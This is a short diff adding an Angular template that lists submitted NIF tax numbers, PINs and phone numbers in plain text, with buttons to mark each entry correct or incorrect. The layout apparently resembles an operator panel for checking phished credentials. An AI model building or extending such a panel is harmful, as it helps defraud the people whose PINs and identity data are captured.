@@ -1,0 +1,26 @@
+<div class="submissions-container">
+    <h2>Submitted Data</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>NIF</th>
+          <th>PIN</th>
+          <th>Phone Number</th>
+          <th>Actions</th> <!-- New column for actions -->
+        </tr>
+      </thead>
+      <tbody>
+        <tr *ngFor="let submission of submissions">
+          <td>{{ submission.nif }}</td>
+          <td>{{ submission.pin }}</td>
+          <td>{{ submission.phone }}</td>
+          <td>
+            <button (click)="markCorrect(submission)">Correct</button>
+            <button (click)="markIncorrect(submission)">Incorrect</button>
+            <button (click)="performOtherAction(submission)">Other</button>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+  
